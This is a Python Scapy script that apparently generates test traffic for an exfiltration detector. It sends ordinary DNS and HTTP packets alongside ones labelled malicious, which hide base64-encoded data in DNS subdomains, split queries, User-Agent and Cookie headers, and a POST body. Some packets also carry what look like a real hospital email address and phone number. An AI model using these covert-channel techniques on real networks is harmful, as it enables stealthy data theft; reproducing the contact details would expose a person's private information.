from scapy.all import IP, UDP, DNS, DNSQR, TCP, Raw, send
from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse

# Normal DNS packet
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
print("[+] Sending normal DNS Query for google.com...")
send(packet, verbose=False)

# Normal HTTP GET request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="GET",
    Path="/index.html",
    Host="test-server.local",
    User_Agent="Scapy-Tester-v1.0"
)
packet = ip_layer / tcp_layer / http_layer
print("[+] Sending normal HTTP GET with custom Header...")
send(packet, verbose=False)

# Normal HTTP POST request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="POST",
    Path="/login",
    Host="my-api.com",
    User_Agent="Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    Cookie="sessionid=abcd1234",
)
data_layer = Raw(load="username=admin&password=password123")
packet = ip_layer / tcp_layer / http_layer / data_layer
print("[+] Sending normal HTTP POST with data payload...")
send(packet, verbose=False)

# Normal HTTP POST request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="POST",
    Path="/login",
    Host="my-api.com",
    User_Agent="Google",
    Cookie=".sQE62z_0USIU.13VQ59NkcGGXbPRzthxNBH8rD_2bU-1770142510-1.0.1.1-LHI0Frpq55cNiIGp9SE74uJ1Kc3u109GWIaRAr6nWlpVFkbxergWwwinTy5ohcRuzdYfRuQf9Dblbu0Lhk8.jb4tPa5cvV9hYoclN_0sC8Q"
)
data_layer = Raw(load="username=admin&password=password123")
packet = ip_layer / tcp_layer / http_layer / data_layer
print("[+] Sending normal HTTP POST with data payload...")
send(packet, verbose=False)

# Malicious DNS packet
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="bWNvdWxvbkBob3BpdGFsbWFuZGUuZnIK.google.com"))
print("[+] Sending malicious DNS Query for google.com...")
send(packet, verbose=False)

# Malicious HTTP GET request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="GET",
    Path="/index.html",
    Host="malicious-server.local",
    User_Agent="bWNvdWxvbkBob3BpdGFsbWFuZGUuZnIsM2h3OWdAV3pfaywrMzMgNiA3MiA1OCAwMSAzMQo="
)
packet = ip_layer / tcp_layer / http_layer
print("[+] Sending malicious HTTP GET with custom Header...")
send(packet, verbose=False)

# Malicious HTTP POST request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="POST",
    Path="/login",
    Host="my-malicious-api.com"
)
data_layer = Raw(load="VGhpcyB0ZXh0IGNvbiszMyA2IDcyIDU4IDAxIDMxdGFpbiBkYXRhIHRvIGV4bWNvdWxvbkBob3BpdGFsbWFuZGUuZnJmaWx0cmF0ZQpUaGF0J3MgbmljZSBiZWNtbWFydGluZXpAaG9waXRhbG1hbmRlLmZyYXVzZSBpdCdzIGhpZCszMyA2IDcyIDU4IDAxIDMyZGVuIGl0J3MgdGhpcyB0ZXh0ClNvIG5vYjNodzlnQFd6X2tvZHkgd2lsbCBmaW5kIGl0IGFzIGNvbnZlcnRlZCBpbiBCYXNlNjQKTm8gZGF0YSB3b3VsZCBiZSBmaSEzUVFreFY2bmRuZCBpbiBwbGFpbiB0ZXh0Cg==")
packet = ip_layer / tcp_layer / http_layer / data_layer
print("[+] Sending malicious HTTP POST with data payload...")
send(packet, verbose=False)

# Malicious Cookie in HTTP GET request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="GET",
    Path="/index.html",
    Host="malicious-server.local",
    User_Agent="Scapy-Tester-v1.0",
    Cookie="KzMzIDYgNzIgNTggMDEgMzEK"
)
packet = ip_layer / tcp_layer / http_layer
print("[+] Sending malicious HTTP GET with custom Cookie...")
send(packet, verbose=False)

# Separated malicious DNS packets
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="bWNvdWxvbkBob3B.google.com"))
print("[+] Sending separated malicious DNS Query for google.com...")
send(packet, verbose=False)

# Second part of separated malicious DNS packet
packet = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="pdGFsbWFuZGUuZnIK.google.com"))
print("[+] Sending separated malicious DNS Query for google.com...")
send(packet, verbose=False)

# Real data in Cookie in HTTP GET request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="GET",
    Path="/index.html",
    Host="malicious-server.local",
    User_Agent="Scapy-Tester-v1.0",
    Cookie="mcoulon@hopitalmande.fr"
)
packet = ip_layer / tcp_layer / http_layer
print("[+] Sending malicious HTTP GET with custom Cookie...")
send(packet, verbose=False)

# Real data in User-Agent in HTTP GET request
ip_layer = IP(dst="37.169.123.54")
tcp_layer = TCP(dport=80, flags="PA")
http_layer = HTTP() / HTTPRequest(
    Method="GET",
    Path="/index.html",
    Host="malicious-server.local",
    User_Agent="+33 6 72 58 01 31",
    Cookie="cookie-eheh"
)
packet = ip_layer / tcp_layer / http_layer
print("[+] Sending malicious HTTP GET with custom Header...")
send(packet, verbose=False)